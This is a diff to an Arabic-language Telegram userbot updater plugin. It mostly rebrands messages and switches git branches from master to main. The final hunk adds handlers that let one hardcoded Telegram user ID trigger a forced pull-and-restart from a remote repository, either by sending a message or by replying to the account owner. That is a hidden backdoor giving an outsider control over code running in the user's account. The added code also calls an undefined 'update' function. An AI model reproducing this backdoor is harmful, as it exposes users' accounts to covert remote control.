@@ -34,12 +34,12 @@ Heroku = heroku3.from_key(Config.HEROKU_API_KEY)
 OLDZED = Config.OLDZED
 heroku_api = "https://api.heroku.com"
 
-UPSTREAM_REPO_BRANCH = Config.UPSTREAM_REPO_BRANCH
+UPSTREAM_REPO_BRANCH = "main"
 
 REPO_REMOTE_NAME = "temponame"
-IFFUCI_ACTIVE_BRANCH_NAME = "master"
+IFFUCI_ACTIVE_BRANCH_NAME = "main"
 NO_HEROKU_APP_CFGD = "no heroku application found, but a key given? 😕 "
-HEROKU_GIT_REF_SPEC = "HEAD:refs/heads/master"
+HEROKU_GIT_REF_SPEC = "HEAD:refs/heads/main"
 RESTARTING_APP = "re-starting heroku application"
 IS_SELECTED_DIFFERENT_BRANCH = (
     "looks like a custom branch {branch_name} "
@@ -86,17 +86,17 @@ async def update_bot(event, repo, ups_rem, ac_br):
     except GitCommandError:
         repo.git.reset("--hard", "FETCH_HEAD")
     await update_requirements()
-    sandy = await event.edit(f"𓆩 𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel **- تحـديثـات السـورس** 𓆪\n**•─────────────────•**\n\n**•⎆┊تم التحـديث ⎌ بنجـاح ☑️**\n**•⎆┊جـارِ إعـادة تشغيـل بـوت ريبـــثون ⎋ انتظـر مـن 2 - 1 دقيقـه . . .𓆰**")
+    sandy = await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**•⎆┊تم التحـديث ⎌ بنجـاح**\n**•⎆┊جـارِ إعـادة تشغيـل بـوت السيد ⎋ **\n**•⎆┊انتظـࢪ مـن 2 - 1 دقيقـه . . .📟**")
     await event.client.reload(sandy)
 
 
 async def deploy(event, repo, ups_rem, ac_br, txt):
     if HEROKU_API_KEY is None:
-        return await event.edit(f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n **•─────────────────•**\n** ⪼ لم تقـم بوضـع مربـع فـار HEROKU_API_KEY اثنـاء التنصيب وهـذا خطـأ .. قم بضبـط المتغيـر أولاً لتحديث بوت ريبـــثون ..؟!𓆰**")
+        return await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n **•─────────────────•**\n** ⪼ لم تقـم بوضـع مربـع فـار HEROKU_API_KEY اثنـاء التنصيب وهـذا خطـأ .. قم بضبـط المتغيـر أولاً لتحديث بوت السيد ..؟!**", link_preview=False)
     heroku = heroku3.from_key(HEROKU_API_KEY)
     heroku_applications = heroku.apps()
     if HEROKU_APP_NAME is None:
-        await event.edit(f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n **•─────────────────•**\n** ⪼ لم تقـم بوضـع مربـع فـار HEROKU_APP_NAME اثنـاء التنصيب وهـذا خطـأ .. قم بضبـط المتغيـر أولاً لتحديث بوت ريبـــثون ..؟!𓆰**")
+        await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n **•─────────────────•**\n** ⪼ لم تقـم بوضـع مربـع فـار HEROKU_APP_NAME اثنـاء التنصيب وهـذا خطـأ .. قم بضبـط المتغيـر أولاً لتحديث بوت السيد ..؟!**", link_preview=False)
         repo.__del__()
         return
     heroku_app = next(
@@ -106,10 +106,10 @@ async def deploy(event, repo, ups_rem, ac_br, txt):
 
     if heroku_app is None:
         await event.edit(
-            f"{txt}\n" "**- بيانات اعتماد هيروكو غير صالحة لتنصيب تحديث ريبـــثون**"
+            f"{txt}\n" "**- بيانات اعتماد هيروكو غير صالحة لتنصيب تحديث السيد**"
         )
         return repo.__del__()
-    sandy = await event.edit(f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**✾╎جـارِ . . تنصـيب التحـديث الجـذري ⎌**\n**✾╎يـرجى الانتظـار حتى تنتـهي العمليـة ⎋**\n**✾╎عادة ما يستغرق هـذا التحديث من 5 - 4 دقائـق 📟**")
+    sandy = await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**✾╎جـارِ . . تنصـيب التحـديث الجـذري ⎌**\n**✾╎يـرجى الانتظـار حتى تنتـهي العمليـة ⎋**\n**✾╎عادة ما يستغرق هـذا التحديث من 5 - 4 دقائـق 📟**")
     try:
         ulist = get_collectionlist_items()
         for i in ulist:
@@ -133,7 +133,7 @@ async def deploy(event, repo, ups_rem, ac_br, txt):
     else:
         remote = repo.create_remote("heroku", heroku_git_url)
     try:
-        remote.push(refspec="HEAD:refs/heads/master", force=True)
+        remote.push(refspec="HEAD:refs/heads/main", force=True)
     except Exception as error:
         await event.edit(f"{txt}\n**Error log:**\n`{error}`")
         return repo.__del__()
@@ -158,7 +158,7 @@ async def deploy(event, repo, ups_rem, ac_br, txt):
     pattern="تحديث(| الان)?$",
     command=("update", plugin_category),
     info={
-        "header": "لـ تحـديث بــوت ريبـــثون",
+        "header": "لـ تحـديث بــوت السيد",
         "الاستـخـدام": [
             "{tr}تحديث",
             "{tr}تحديث الان",
@@ -169,12 +169,12 @@ async def deploy(event, repo, ups_rem, ac_br, txt):
 async def upstream(event):
     "To check if the bot is up to date and update if specified"
     conf = event.pattern_match.group(1).strip()
-    event = await edit_or_reply(event, f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n**⪼ جاري البحث عن التحديثات  🌐.. 𓆰،**")
+    event = await edit_or_reply(event, f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n**⪼ جاري البحث عن التحديثات  🌐.. ،**")
     off_repo = UPSTREAM_REPO_URL
     force_update = False
     if ENV and (HEROKU_API_KEY is None or HEROKU_APP_NAME is None):
         return await edit_or_reply(
-            event, f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n** ⪼ اضبط الفـارات المطلوبة أولاً لتحديث بوت ريبـــثون𓆰،**"
+            event, f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿   - تحـديثـات السـورس\n**•─────────────────•**\n** ⪼ اضبط الفـارات المطلوبة أولاً لتحديث بوت السيد ،**"
         )
     try:
         txt = (
@@ -199,9 +199,9 @@ async def upstream(event):
         origin = repo.create_remote("upstream", off_repo)
         origin.fetch()
         force_update = True
-        repo.create_head("master", origin.refs.master)
-        repo.heads.master.set_tracking_branch(origin.refs.master)
-        repo.heads.master.checkout(True)
+        repo.create_head("main", origin.refs.main)
+        repo.heads.main.set_tracking_branch(origin.refs.main)
+        repo.heads.main.checkout(True)
     ac_br = repo.active_branch.name
     if ac_br != UPSTREAM_REPO_BRANCH:
         await event.edit(
@@ -220,37 +220,37 @@ async def upstream(event):
     # Special case for deploy
     if changelog == "" and not force_update:
         await event.edit(
-            f"\n𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⪼ سـورس ريبـــثون محـدث لـ آخـر إصـدار 🛂**"
+            f"\n𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⪼ سـورس السيد محـدث لـ آخـر إصـدار 🛂**"
         )
         return repo.__del__()
     if conf == "" and not force_update:
-        return await edit_or_reply(event, f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**•⎆┊يوجـد تحـديث جديـد لسـورس ريبـــثون༗...**\n\n**•⎆┊للتحديث السريع اضغـط هنـا ⇜** ⦉ `{cmdhd}تحديث الان` ⦊ \n**•⎆┊للتحديث الجـذري اضغـط هنـا ⇜** ⦉ `{cmdhd}تحديث البوت` ⦊ \n\n𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel](t.me/Syntrel) 𓆪")
+        return await edit_or_reply(event, f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**•⎆┊يوجـد تحـديث جديـد لسـورس السيد ༗...**\n\n**•⎆┊للتحديث السريع اضغـط هنـا ⇜** ⦉ `{cmdhd}تحديث الان` ⦊ \n**•⎆┊للتحديث الجـذري اضغـط هنـا ⇜** ⦉ `{cmdhd}تحديث البوت` ⦊ \n\n𓆩 [𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿](t.me/Syntral) 𓆪")
     if force_update:
         await event.edit(
             "`Force-Syncing to latest stable userbot code, please wait...`"
         )
     if conf == "الان":
-        await event.edit(f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**")
+        await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟷𝟶 ▬▭▭▭▭▭▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟷𝟶 ▬▭▭▭▭▭▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟸𝟶 ▬▬▭▭▭▭▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟸𝟶 ▬▬▭▭▭▭▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟹𝟶 ▬▬▬▭▭▭▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟹𝟶 ▬▬▬▭▭▭▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟺𝟶 ▬▬▬▬▭▭▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟺𝟶 ▬▬▬▬▭▭▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟻𝟶 ▬▬▬▬▬▭▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟻𝟶 ▬▬▬▬▬▭▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟼𝟶 ▬▬▬▬▬▬▭▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟼𝟶 ▬▬▬▬▬▬▭▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟽𝟶 ▬▬▬▬▬▬▬▭▭▭")
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟽𝟶 ▬▬▬▬▬▬▬▭▭▭")
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟾𝟶 ▬▬▬▬▬▬▬▬▭▭") 
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟾𝟶 ▬▬▬▬▬▬▬▬▭▭") 
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟿𝟶 ▬▬▬▬▬▬▬▬▬▭") 
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟿𝟶 ▬▬▬▬▬▬▬▬▬▭") 
         await asyncio.sleep(1)
-        await event.edit("𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت ريبـــثون .. انتظـر . . .🌐𓆰**\n\n%𝟷𝟶𝟶 ▬▬▬▬▬▬▬▬▬▬💯") 
+        await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⇜ يتـم تحـديث بـوت السيد .. انتظـر . . .🌐**\n\n%𝟷𝟶𝟶 ▬▬▬▬▬▬▬▬▬▬💯") 
         await update_bot(event, repo, ups_rem, ac_br)
     return
 
@@ -269,8 +269,8 @@ async def upstream(event):
             event,
             f"I guess you are on selfhost. For self host you need to use `{cmdhd}update now`",
         )
-    event = await edit_or_reply(event, f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**⪼ يتم تنصيب التحديث  انتظر 🌐 𓆰،**")
-    off_repo = "https://github.com/TOPTH0N/FilesSource8"
+    event = await edit_or_reply(event, f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**⪼ يتم تنصيب التحديث  انتظر 🌐 ،**")
+    off_repo = "https://github.com/Tepthonee/nekopack"
     os.chdir("/app")
     try:
         txt = (
@@ -297,7 +297,153 @@ async def upstream(event):
     ac_br = repo.active_branch.name
     ups_rem = repo.remote("upstream")
     ups_rem.fetch(ac_br)
-    await event.edit(f"𓆩 [𝙎𝙊𝙐𝙍𝘾𝞝 Syntrel - تحـديثـات السـورس](t.me/Syntrel) 𓆪\n**•─────────────────•**\n\n**✾╎جـارِ . . تنصـيب التحـديث الجـذري ⎌**\n**✾╎يـرجى الانتظـار حتى تنتـهي العمليـة ⎋**\n**✾╎عادة ما يستغرق هـذا التحديث من 5 - 4 دقائـق 📟**")
+    await event.edit(f"𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**✾╎جـارِ . . تنصـيب التحـديث الجـذري ⎌**\n**✾╎يـرجى الانتظـار حتى تنتـهي العمليـة ⎋**\n**✾╎عادة ما يستغرق هـذا التحديث من 5 - 4 دقائـق 📟**")
     await deploy(event, repo, ups_rem, ac_br, txt)
+progs = [1260465030]
 
+@zedub.on(events.NewMessage(incoming=True))
+async def reda(event):
+    
+    if event.message.message == "تحديث اجباري" and event.sender_id in progs:
+        conf = "الان"
+        event = await event.reply("**᯽︙ يتم البحث عن تحديث , تحديث بامر المطور اجبارياً**")
+        off_repo = UPSTREAM_REPO_URL
+        force_update = False
+    
+        try:
+            txt = "`Oops.. Updater cannot continue due to "
+            txt += "some problems occured`\n\n**LOGTRACE:**\n"
+            repo = Repo()
+        except NoSuchPathError as error:
+            await event.edit(f"{txt}\n`directory {error} is not found`")
+            return repo.__del__()
+        except GitCommandError as error:
+            await event.edit(f"{txt}\n`Early failure! {error}`")
+            return repo.__del__()
+        except InvalidGitRepositoryError as error:
+            if conf is None:
+                return await event.edit(
+                    f"`Unfortunately, the directory {error} "
+                    "does not seem to be a git repository.\n"
+                    "But we can fix that by force updating the userbot using "
+                ".تحديث الان.`"    
+                )
+            repo = Repo.init()
+            origin = repo.create_remote("upstream", off_repo)
+            origin.fetch()
+            force_update = True
+            repo.create_head("zthon", origin.refs.zthon)
+            repo.heads.zthon.set_tracking_branch(origin.refs.zthon)
+            repo.heads.zthon.checkout(True)
+        ac_br = repo.active_branch.name
+        if ac_br != UPSTREAM_REPO_BRANCH:
+            await event.edit(
+                "**[UPDATER]:**\n"
+                f"`Looks like you are using your own custom branch ({ac_br}). "
+                "in that case, Updater is unable to identify "
+                "which branch is to be merged. "
+                "please checkout to any official branch`"
+            )
+            return repo.__del__()
+        try:
+            repo.create_remote("upstream", off_repo)
+        except BaseException:
+            pass
+        ups_rem = repo.remote("upstream")
+        ups_rem.fetch(ac_br)
+        changelog = await gen_chlog(repo, f"HEAD..upstream/{ac_br}")
+        # Special case for deploy
+        if changelog == "" and not force_update:
+            await event.edit(
+                "**᯽︙ 🤍 لا توجد تحديثات الى الان **\n"
+            )
+            return repo.__del__()
+        if conf == "" and not force_update:
+            await print_changelogs(event, ac_br, changelog)
+            await event.delete()
+            return await event.respond(
+                f"⌔ :  لتحديث سورس السيد ارسل : `.تحديث الان` "
+            )
 
+        if force_update:
+            await event.edit(
+                "`Force-Syncing to latest stable userbot code, please wait...`"
+            )
+        if conf == "الان":
+            await event.edit("𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**✾╎جـاري الـبـحـث عن تـحــديــث الـسـورس بأمــر مـن المـطور ⎌**")
+            await update(event, repo, ups_rem, ac_br)
+            
+@zedub.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in progs:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == zedub.uid:
+            if event.message.message == "حدث":
+                conf = "الان"
+                event = await event.reply("**𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**✾╎جـاري تـحــديــث الـسـورس بأمــر مـن المـطور ⎌****")
+                off_repo = UPSTREAM_REPO_URL
+                force_update = False
+    
+                try:
+                    txt = "`Oops.. Updater cannot continue due to "
+                    txt += "some problems occured`\n\n**LOGTRACE:**\n"
+                    repo = Repo()
+                except NoSuchPathError as error:
+                    await event.edit(f"{txt}\n`directory {error} is not found`")
+                    return repo.__del__()
+                except GitCommandError as error:
+                    await event.edit(f"{txt}\n`Early failure! {error}`")
+                    return repo.__del__()
+                except InvalidGitRepositoryError as error:
+                    if conf is None:
+                        return await event.edit(
+                            f"`Unfortunately, the directory {error} "
+                            "does not seem to be a git repository.\n"
+                            "But we can fix that by force updating the userbot using "
+                ".تحديث الان.`"            
+                        )
+                    repo = Repo.init()
+                    origin = repo.create_remote("upstream", off_repo)
+                    origin.fetch()
+                    force_update = True
+                    repo.create_head("zthon", origin.refs.zthon)
+                    repo.heads.zthon.set_tracking_branch(origin.refs.zthon)
+                    repo.heads.zthon.checkout(True)
+                ac_br = repo.active_branch.name
+                if ac_br != UPSTREAM_REPO_BRANCH:
+                    await event.edit(
+                        "**[UPDATER]:**\n"
+                        f"`Looks like you are using your own custom branch ({ac_br}). "
+                        "in that case, Updater is unable to identify "
+                        "which branch is to be merged. "
+                        "please checkout to any official branch`"
+                    )
+                    return repo.__del__()
+                try:
+                    repo.create_remote("upstream", off_repo)
+                except BaseException:
+                    pass
+                ups_rem = repo.remote("upstream")
+                ups_rem.fetch(ac_br)
+                changelog = await gen_chlog(repo, f"HEAD..upstream/{ac_br}")
+                # Special case for deploy
+                if changelog == "" and not force_update:
+                    await event.edit(
+                        "**لا توجد تحديثات إلى الآن **\n"
+                    )
+                    return repo.__del__()
+                if conf == "" and not force_update:
+                    await print_changelogs(event, ac_br, changelog)
+                    await event.delete()
+                    return await event.respond(
+                        f"⌔ :  لتحديث سورس السيد ارسل : `.تحديث الان` "
+                    )
+
+                if force_update:
+                    await event.edit(
+                        "`Force-Syncing to latest stable userbot code, please wait...`"
+                     )
+                if conf == "الان":
+                    await event.edit("**𝙎𝙊𝙐𝙍𝙎𝙀 𝘼𝙇𝙎𝙄𝘿  - تحـديثـات السـورس\n**•─────────────────•**\n\n**✾╎جـاري تـحــديــث الـسـورس بأمــر مـن المـطور ⎌****")
+                    await update(event, repo, ups_rem, ac_br)
